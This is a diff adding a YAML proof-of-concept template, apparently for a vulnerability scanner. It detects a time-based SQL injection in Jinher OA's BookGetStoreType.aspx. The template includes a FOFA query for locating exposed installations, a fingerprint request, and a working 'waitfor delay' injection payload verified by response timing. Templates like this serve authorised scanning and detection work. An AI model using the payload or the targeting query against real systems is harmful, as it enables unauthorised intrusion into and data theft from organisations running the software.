@@ -1,0 +1,29 @@
+id: poc-yaml-jinher-jhsoft-bookgetstoretype-aspx-sqli
+info:
+  name: 金和OA BookGetStoreType.aspx SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 金和OA
+  fofa: app="金和网络-金和OA"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 2
+requests:
+- method: GET
+  path: /C6/Jhsoft.Web.login/PassWordSlideFull.aspx
+  expression: contains(body,"JHSoft")
+- method: GET
+  path: /c6/Jhsoft.Web.Books/BookGetStoreType.aspx/?StoreID=1'waitfor+delay%270:0:{{.t1}}%27--
+  expression: 'status_code == 200 &&
+
+    contains(headers,"ASP.NET_SessionId=") &&
+
+    body == "" &&
+
+    duration >= t1 &&
+
+    duration <= t2
+
+    '
+transport: http
